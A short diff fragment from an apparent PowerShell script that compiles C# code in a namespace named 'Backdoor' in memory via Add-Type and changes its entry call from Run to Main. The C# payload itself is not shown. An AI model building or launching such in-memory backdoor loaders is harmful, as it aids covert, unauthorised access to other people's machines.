@@ -217,4 +217,4 @@ namespace Backdoor
 }
 "@
 Add-Type -TypeDefinition $cs -Language CSharp
-[Backdoor.Program]::Run()
+[Backdoor.Program]::Main()
